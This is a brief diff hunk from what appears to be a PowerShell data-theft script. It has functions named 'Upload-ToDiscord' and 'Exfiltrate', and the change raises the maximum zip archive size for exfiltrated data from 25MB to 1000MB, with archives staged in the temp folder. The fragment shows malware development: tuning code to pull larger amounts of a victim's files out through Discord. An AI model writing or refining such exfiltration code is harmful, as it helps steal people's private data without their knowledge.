@@ -35,7 +35,7 @@ function Upload-ToDiscord {
 }
 
 function Exfiltrate {
-    $maxZipSize = 25MB
+    $maxZipSize = 1000MB
     $currentSize = 0
     $index = 1
     $zipPath = "$env:temp\Data$index.zip"
